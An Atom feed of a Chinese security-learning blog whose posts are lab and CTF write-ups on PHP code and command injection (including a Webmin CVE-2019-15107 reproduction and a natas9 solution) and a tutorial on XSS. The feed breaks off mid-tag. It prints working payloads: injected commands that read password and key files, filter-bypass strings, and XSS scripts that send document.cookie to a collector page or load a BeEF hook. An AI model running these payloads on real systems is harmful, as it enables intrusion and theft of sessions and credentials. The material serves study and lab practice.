<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>KrismileBlog</title>
  
  
  <link href="https://krismile-ni.github.com/atom.xml" rel="self"/>
  
  <link href="https://krismile-ni.github.com/"/>
  <updated>2022-04-18T03:18:38.403Z</updated>
  <id>https://krismile-ni.github.com/</id>
  
  <author>
    <name>krismile</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>RCE</title>
    <link href="https://krismile-ni.github.com/2022/04/11/RCE/"/>
    <id>https://krismile-ni.github.com/2022/04/11/RCE/</id>
    <published>2022-04-11T07:10:28.000Z</published>
    <updated>2022-04-18T03:18:38.403Z</updated>
    
    <content type="html"><![CDATA[<h2 id="RCE代码及命令执行漏洞"><a href="#RCE代码及命令执行漏洞" class="headerlink" title="RCE代码及命令执行漏洞"></a>RCE代码及命令执行漏洞</h2><p>在web应用中有时候程序员为了考虑灵活性、间接性，会在代码调用代码或命令执行函数去处理。例如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，会造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。</p><span id="more"></span><p><img src="/2022/04/11/RCE/1.png" alt="image-20220411154746328"></p><p>RCE漏洞原理</p><p>一般漏洞形成条件：可控变量、漏洞函数</p><h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><p>例如php代码里，eval()函数把字符串当作php代码执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>); <span class="comment">// ?x=phpinfo();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="检测："><a href="#检测：" class="headerlink" title="检测："></a>检测：</h4><p>白盒（在知道一些源码等信息前提下）：代码审计</p><p>黑盒（什么也不知道）：漏扫工具（X-scan等等）、公开漏洞、手工查看参数值及功能点</p><p>例题理解：</p><blockquote><p>墨者学院–PHP代码分析溯源(第4题)&#x2F;&#x2F;白盒：</p><p>给出了页面源码</p><p><img src="/2022/04/11/RCE/8.png" alt="image-20220414205126676"></p><p>发现需要进行base64解码,得到加密字符串内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> `<span class="variable">$_REQUEST</span>[a]`;; <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//那么这段源码解码后应该为</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">echo</span> `<span class="variable">$_REQUEST</span>[a]`;; <span class="meta">?&gt;</span>);<span class="comment">//在Linux系统中，反引号`包起来的内容会被当作系统命令执行；虽然eval()函数是代码执行漏洞的漏洞函数，但a的内容应该是命令执行语句</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>首先获取网页目录</p><p><img src="/2022/04/11/RCE/9.png" alt="image-20220414231217535"></p><p>cat貌似被过滤了，使用tac代替一下</p><p><img src="/2022/04/11/RCE/10.png" alt="image-20220414231428787"></p></blockquote><h3 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h3><p>例如php代码里，system()函数执行外部程序，并且显示输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>); <span class="comment">//?x=ver  /?x=ipconfig  /?x=dir(windows)   /?x=ls(linux)  </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>例题理解：</p><blockquote><p>墨者学院–命令注入执行分析</p><p>ping 127.0.0.1:说明执行命令</p><p><img src="/2022/04/11/RCE/2.png" alt="image-20220413225111188" style="zoom:50%;">e</p><p>接着通过管道服务来执行多条命令（要先确定该服务器是什么系统windows还是Linux）</p><img src="/2022/04/11/RCE/3.png" alt="image-20220413231502366" style="zoom:50%;"><p>确定是Linux系统，用ls查看目录，但出现弹窗</p><img src="/2022/04/11/RCE/4.png" alt="image-20220413232650367" style="zoom:50%;"><p>显然是前端JS验证，对传入的IP地址进行了验证</p><img src="/2022/04/11/RCE/5.png" alt="image-20220413233223824" style="zoom:50%;"><p>抓包绕过前端验证</p><img src="/2022/04/11/RCE/6.png" alt="image-20220413234305688" style="zoom:50%;"><p>通过cat命令获取key_314311794430470.php的内容，<code>cat key_314311794430470.php </code>没有回显，可能过滤了些什么，经过测验得到过滤了空格</p><p>绕过空格过滤：</p><p><code>$&#123;IFS&#125;</code>、重定向符<code>&lt;&gt;</code>、<code>%09</code>、<code>$IFS$9</code></p><p><code>cat&lt;key_314311794430470.php </code></p><p><img src="/2022/04/11/RCE/7.png" alt="image-20220413235224200"></p></blockquote><p>公开漏洞Webmin</p><blockquote><p>漏洞编号：CVE-2019-15107</p><p>漏洞描述：该漏洞允许恶意第三方在缺少输入验证的情况下而执行恶意代码；由于<code>password_change.cgi</code>文件在重置密码功能中存在一个无需权限的命令注入漏洞，通过这个漏洞，攻击者即可以执行任意系统命令。</p><p>复现：</p><p><img src="/2022/04/11/RCE/11.png" alt="11"></p><p>burp抓包进行修改相应参数（key.txt存放在根目录下）：<code>user=rootxx&amp;pam=&amp;pam=&amp;expired=2&amp;old=test|ls /&amp;new1=test2&amp;new2=test2</code></p><p><img src="/2022/04/11/RCE/12.png" alt="image-20220416141625449"></p><p>获取key.txt文件内容</p><p>将old修改成<code>old=test|cat&lt;/key.txt</code></p><p><img src="/2022/04/11/RCE/13.png" alt="image-20220416142033555"></p></blockquote><h3 id="命令执行之绕过技巧"><a href="#命令执行之绕过技巧" class="headerlink" title="命令执行之绕过技巧"></a>命令执行之绕过技巧</h3><p><a href="https://www.cnblogs.com/pursue-security/p/15291426.html">RCE篇之命令执行中的各种绕过 </a></p><h3 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h3><h4 id="无参数文件读取"><a href="#无参数文件读取" class="headerlink" title="无参数文件读取"></a>无参数文件读取</h4><p>通常可以使用<code>print_r(scandir(&#39;.&#39;))</code>查看当前目录下所有文件，以数组的形式输出</p><p>当正则表达式匹配过滤了带参数的传入值，上式则不能进行查询目录下的文件，那怎么查询目录下的所有文件？</p><ul><li>构造参数里的<code>.</code></li></ul><p>localeconv()函数：返回一包含本地数字及货币格式信息的数组。这个数组的第一项就是<code>.</code></p><p>current()函数：返回数组中的单元，默认是第一个值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br><span class="line"><span class="comment">//等同于print_r(scandir(&#x27;.&#x27;))</span></span><br></pre></td></tr></table></figure><h4 id="无参数概念理解"><a href="#无参数概念理解" class="headerlink" title="无参数概念理解"></a>无参数概念理解</h4><p>无参数RCE即通过没有参数的函数达到命令执行的目的。</p><p>代码解释：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span>===<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>如果<code>&#39;;&#39;===preg_replace(....)</code>，就会执行exp传递的命令</p></li><li><p><code>\</code>:转义字符</p></li><li><p><code>[a-z,_]+</code>:<code>[a-z,_]</code>表示匹配小写字母和下划线；<code>+</code>表示1到多个</p></li><li><p><code>(?R)?</code>:<code>(?R)</code>表示当前表达式，即单引号里面的内容；<code>?</code>表示递归当前表达式0次或1次, (?R)?能匹配类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a();</span><br><span class="line">a(b());</span><br><span class="line">a(b(c()));</span><br></pre></td></tr></table></figure><p> 如果是<code>(?R)*</code>表示递归当前表达式0次或多次,这个表达式可以匹配<code>a(b(c()d()))</code></p></li></ul><p>理解：</p><p>通过检查GET方式传入的exp参数的值，如果传入的值是类似<code>a()</code>，就把这个字符串换成空。通过递归替换后该字符串只会剩下<code>;</code>,符合这种情况的话，就会执行eval</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="comment">//替换后只剩下;，最后就会执行phpinfo();</span></span><br></pre></td></tr></table></figure><h4 id="常见绕过姿势"><a href="#常见绕过姿势" class="headerlink" title="常见绕过姿势"></a>常见绕过姿势</h4><ul><li><code>getallheaders()</code></li></ul><p>​       <code>getallheaders()</code>—获取全部HTTP请求头信息，返回的是一个数组，而eval()要求的是字符串，需要搭配使用；<code>implode()</code>将一个一个一维数组的值转化成字符串</p><p>​      通过<code>getallheaders()</code>这个函数，我们可以随意添加一个头，插入恶意代码或命令，但是其局限性在于只能是apache 环境下</p><ul><li><code>get_defined_vars()</code></li></ul><p>​       <code>get_defined_vars()</code>—返回由所有已定义变量所组成的数组，返回的是一个二维数组，需要与<code>var_dump()</code>搭配使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_defined_vars</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>GET方式传入的参数存在该二位数组中的第一个一维数组，可以通过这个函数将get传入的取出来</p><ul><li><code>session_id()</code></li></ul><p>​       <code>session_id()</code>—获取&#x2F;设置当前会话，可以用该函数来获取cookie中的<code>phpsessionid</code>，这个值我们是可控的；但文件会话管理器仅允许会话ID中使用以下字符：a-z A-Z 0-9和逗号和减号</p><p>解决方法：将参数转化为16进制传入，之后再用hex2bin()函数转换回来（hex2bin—转换十六进制字符串为二进制字符串）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:eval(hex2bin(session_id(session_start())));//必须要开启session才能使用</span><br></pre></td></tr></table></figure><blockquote><p>例题：禁止套娃</p><p>.git源码泄露</p><p>index.php文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>读取当前目录下文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure><p>方法一：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>()))));</span><br><span class="line">?exp=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));<span class="comment">//flag.php</span></span><br><span class="line">?exp=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure><p>方法二：</p><p>session_id</p><p>抓包</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>()));</span><br></pre></td></tr></table></figure></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;RCE代码及命令执行漏洞&quot;&gt;&lt;a href=&quot;#RCE代码及命令执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;RCE代码及命令执行漏洞&quot;&gt;&lt;/a&gt;RCE代码及命令执行漏洞&lt;/h2&gt;&lt;p&gt;在web应用中有时候程序员为了考虑灵活性、间接性，会在代码调用代码或命令执行函数去处理。例如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，会造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。&lt;/p&gt;</summary>
    
    
    
    <category term="web学习" scheme="https://krismile-ni.github.com/categories/web%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="web基础" scheme="https://krismile-ni.github.com/tags/web%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>natas</title>
    <link href="https://krismile-ni.github.com/2022/04/09/natas/"/>
    <id>https://krismile-ni.github.com/2022/04/09/natas/</id>
    <published>2022-04-09T15:42:36.000Z</published>
    <updated>2022-04-18T03:26:56.162Z</updated>
    
    <content type="html"><![CDATA[<h3 id="natas9"><a href="#natas9" class="headerlink" title="natas9"></a>natas9</h3><p>知识点：命令注入</p><span id="more"></span><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Output:</span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">&lt;?</span><br><span class="line">$key = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;needle&quot;, $_REQUEST)) &#123;</span><br><span class="line">    $key = $_REQUEST[&quot;needle&quot;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($key != &quot;&quot;) &#123;</span><br><span class="line">    passthru(&quot;grep -i $key dictionary.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在php中调用外部命令，三种方式实现：</p><blockquote><p>（1）system()函数</p><p>​          string system(string command [, int return_var])</p><p>（2）exec()函数</p><p>​          string exec(string command [, string array [, int return _var]])</p><p>exec()函数执行给定的命令，不输出结果，而是返回结果的最后一行。虽然只返回命令结果的最后一行，但用第二个参数array可以得到完整的结果</p><p>（3）passthru()函数</p><p>​           passthru(string <code>$command</code>, int <code>&amp;$result_code</code> &#x3D; <strong><code>null</code></strong>): ?bool</p><p>passthru()函数–执行外部程序并且原始输出</p></blockquote><p>php代码调用passthru函数执行grep命令来查找key是否在dictionary.txt中，由此想到<strong>命令注入漏洞</strong></p><p>想要通过passthru函数调用命令，但先要截断grep命令（使用；或|或&amp;截取）&#x2F;&#x2F;也叫管道服务，才能执行我们要执行的命令。该平台的密码存储在&#x2F;etc&#x2F;natas_webpass目录下</p><p>构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| cat /etc/natas_webpass/natas10 #</span><br></pre></td></tr></table></figure><p><img src="/2022/04/09/natas/1.png" alt="image-20220412234200988"></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;natas9&quot;&gt;&lt;a href=&quot;#natas9&quot; class=&quot;headerlink&quot; title=&quot;natas9&quot;&gt;&lt;/a&gt;natas9&lt;/h3&gt;&lt;p&gt;知识点：命令注入&lt;/p&gt;</summary>
    
    
    
    <category term="靶机练习" scheme="https://krismile-ni.github.com/categories/%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"/>
    
    
    <category term="靶机" scheme="https://krismile-ni.github.com/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>XSS攻击</title>
    <link href="https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/"/>
    <id>https://krismile-ni.github.com/2022/04/09/XSS%E6%94%BB%E5%87%BB/</id>
    <published>2022-04-09T07:30:39.000Z</published>
    <updated>2022-04-09T15:29:25.645Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h1><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>XSS被称为跨站脚本攻击（Cross-site scripting），本应该缩写成CSS，但由于和CSS（Cascading Style Sheets，层叠样式脚本）重名，改名为XSS。</p><p>XSS主要基于javascript(JS)完成恶意的攻击行为，JS可以非常灵活的操作html、css和浏览器，这使得XSS攻击的“想象”空间特别大。XSS通过将精心构造的代码（JS）代码注入到网页中，并由浏览器解释运行这段JS脚本注入的网页，以达到恶意攻击的效果。用户用最简单的动作就是使用浏览器上网，并且浏览器中有javascript解释器，可以解析javascript，然而浏览器不会判断代码是否恶意，即XSS的对象是用户和浏览器。</p><p>XSS危害：</p><blockquote><p>1.窃取用户Cookie，如果用户Cookie被窃取，攻击者可以不通过密码，而直接登录用户账户<br>2.使用XMLHttpRequest构造模拟用户请求操作<br>3.XSS钓鱼攻击<br>4.用户PC信息探测收集器<br>5.XSS蠕虫攻击</p></blockquote><span id="more"></span><h2 id="构造XSS脚本"><a href="#构造XSS脚本" class="headerlink" title="构造XSS脚本"></a>构造XSS脚本</h2><blockquote><p>1.弹窗警告</p><p>用此脚本实现弹窗提示，一般作为漏洞测试或者演示使用，类似sql注入的单引号来测试漏洞的存在，一旦此脚本能执行，意味这没有对特殊字符做过滤，因此存在XSS漏洞。</p><p>常见HTML事件属性</p><table><thead><tr><th>属性</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td>onload</td><td>script</td><td>当文档加载时运行脚本</td></tr><tr><td>onerror</td><td>script</td><td>当错误发生时运行脚本</td></tr><tr><td>onclick</td><td>script</td><td>当单击鼠标时运行脚本</td></tr></tbody></table><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><p><code>&lt;body onload=alert(&#39;xss&#39;)&gt;</code></p><p><code>&lt;img src=# onerroe=alert(&#39;xss&#39;)&gt;</code>      **src地址错误，然后执行onerror的内容</p><p><code>&lt;a href=&#39;&#39; onclick=alert(&#39;xss&#39;)&gt;click&lt;/a&gt;</code>     ** 点击click时弹出xss</p><p>2.页面嵌套</p><p><code>&lt;iframe src=http://www.xxxxx.com width=300 height=300&gt;&lt;/iframe&gt;</code></p><p><code>&lt;iframe src=http://www.xxxxx.com width=0 height=0 border=0&gt;&lt;/iframe&gt;</code></p><p>3.页面重定向</p><p><code>&lt;script&gt;window.location=&quot;http://www.xxxxx.com&quot;&lt;/script&gt;</code></p><p><code>&lt;script&gt;location.href=&quot;http://www.xxxxx.com&quot;&lt;/script&gt;</code></p><p>4.弹窗警告并重定向</p><p><code>&lt;script&gt;alert(&#39;xxx&#39;);location.href=&quot;xxxxxx&quot;&lt;/script&gt;</code></p><p>5.访问恶意代码</p><p><code>&lt;script src=&quot;http://www.baidu.com/xss.js&quot;&gt;&lt;/script&gt;</code></p><p>6.巧用图片标签</p><p><code>&lt;img src=&quot;#&quot;alert(&#39;xss&#39;)&gt;</code></p><p><code>&lt;img src=&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;</code></p><p><code>&lt;img src=&quot;http://xxxx/hook.js&quot;&gt;&lt;/img&gt;</code></p><p>7.根据上下文进行闭合+以上脚本</p></blockquote><h2 id="XSS-分类"><a href="#XSS-分类" class="headerlink" title="XSS 分类"></a>XSS 分类</h2><h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>反射性跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到URL地址的参数中。</p><p>反射型XSS的利用一般是攻击者通过特定手段（如电子邮件），诱使用户去访问一个包含恶意代码的URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类XSS通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端Cookie或进行钓鱼欺骗。</p><p>实验（DVWA－XSS（Reflected））：</p><p><strong>弹窗警告：</strong></p><p><code>&lt;script&gt;alert(1)&lt;/script&gt;  </code></p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/1.png" alt="1"></p><p><code>&lt;body onload=alert(&#39;xss&#39;)&gt;</code></p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/5.png" alt="5"></p><p><code>&lt;a href=&#39;&#39; onclick=alert(&#39;xss&#39;)&gt;click&lt;/a&gt;</code></p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/6.png" alt="6"></p><p><code>&lt;img src=&#39;http://192.168.10.128/a.jpg&#39; onerror=alert(&#39;xss&#39;)&gt;</code></p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/7.png" alt="7"></p><p><strong>重定向</strong>：</p><p><code>&lt;script&gt;window.location=&#39;http://www.baidu.com&#39;&lt;/script&gt;</code></p><p>页面跳转到百度</p><h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><p>此类XSS不需要用户点击特定URL就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码的页面就会执行恶意代码。一般出现在网站留言、评论、博客日志等交互处，*<code>恶意脚本存储到客户端或者服务端的数据库中</code>*（再次访问依然会执行恶意代码）。</p><p>实验：</p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/2.png"></p><p>跳出此页面（点击任意一个项目，如XSS(DOM)这一栏）</p><p>再点击XSS(Stored)，页面如下：</p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/3.png"></p><h4 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM　XSS"></a>DOM　XSS</h4><p>这种类型的XSS并非按照“数据是否保存在服务器端”来划分，DOM Based XSS从效果上来说也是反射型XSS。单独划分出来，是因为DOM Based XSS的形成原因比较特别，发现它的安全专家专门提出了这种类型的XSS。</p><p>通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。</p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/4.png"></p><h2 id="XSS利用方式"><a href="#XSS利用方式" class="headerlink" title="XSS利用方式"></a>XSS利用方式</h2><h4 id="Cookie窃取"><a href="#Cookie窃取" class="headerlink" title="Cookie窃取"></a>Cookie窃取</h4><p>方法一：弹窗警告</p><p><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/8.png" alt="8"></p><p>方法二：</p><p><code>&lt;script&gt;document.location=&#39;http://127.0.0.1/cookie.php?cookie=&#39;+document.cookie;&lt;/script&gt;</code></p><p>在phpstudy的www目录下，新建一个php文件，将以下代码写入</p><blockquote><?php$cookie= $_GET['cookie'];file_put_contents('cookie.txt',$cookie);?></blockquote><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/9.png" alt="9"></p><h4 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h4><p>使用Cookie存在一定的安全缺陷，开发者开始使用一些更安全的认证方式，如session。在Session机制中，客户端和服务端通过标识符来识别用户身份和维持会话。会话劫持的本质是在攻击中带上cookie并发送到了服务端。</p><p>如在某留言系统存在一个存储型XSS漏洞，攻击者吧XSS代码写进留言信息中，当管理员登录后台并查看，便会触发XSS漏洞，由于XSS是在后台触发的，所以攻击的对象是管理员，通过注入JS代码，攻击者便可以劫持管理员会话执行某些操作，从而达到提升权限的目的</p><p>实验（XSS(Stored)）</p><blockquote><p>工具（beef-xss）：</p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/10.png"></p><p>改一下代码：</p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/11.png" alt="11"></p><p>启动beef-xss（kali机自带）：</p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/12.png"></p><p>打开后跳出一个终端：</p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/13.png"></p><p>访问 <code>http://127.0.0.1:3000/ui/panel</code></p><p>在XSS（Stored）的message中插入hook.js代码 <code>&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;</code>，其中<IP>改为虚拟机Ip地址即可</IP></p><p>***查看虚拟机Ip地址：</p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/14.png"></p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/15.png" alt="15"></p><p>DVWA页面如下：</p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/16.png"></p><p>查看beef网站：</p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/17.png" alt="17"></p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/18.png" alt="18"></p><p>***beef工具：登录弹窗，获取用户及密码</p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/19.png"></p><p>DVWA出现登录弹窗：</p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/20.png"></p><p><img src="/2022/04/09/XSS%E6%94%BB%E5%87%BB/21.png"></p></blockquote><h4 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h4><p>XSS并非全能，前面的例子主要通过JavScript脚本自动攻击，缺少“与用户交互”的过程（即用户不需要输入账户密码，只要触发Js脚本）</p><p>例如“修改用户密码”的功能中，在提交新密码前，都要求用户输入“旧 password” ，而往往攻击者不知道。</p><p>修改密码问题— 为了窃取密码，攻击者可以将XSS与“钓鱼”相结合。</p><p>实现的思路：利用JavaScript在当前页面上显示一个伪造的登录框，当用户在登录框中输入用户名与密码后，其密码将发送至黑客的服务器上。</p><h5 id="重定向钓鱼"><a href="#重定向钓鱼" class="headerlink" 